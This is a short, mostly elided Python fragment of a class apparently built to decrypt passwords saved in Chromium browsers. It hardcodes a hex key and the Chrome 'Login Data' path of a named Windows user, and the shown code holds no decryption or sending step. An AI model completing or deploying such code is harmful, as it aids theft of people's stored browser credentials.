...
class BrowserPasswordDecryptor:
    ...
    def get_chromium_passwords(self, browser: str, profile: str) -> List[Dict]:
        ...
        secret_key = bytes.fromhex("d794cebe79eac5043ab11bf1c786ee38e83a8ae702cbd1ac8e0e010d8d715ff4")
        if not secret_key:
            return []

        # db_path = self.get_browser_path(browser, 'Login Data')
        db_path = "C:\\Users\\quannv33\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
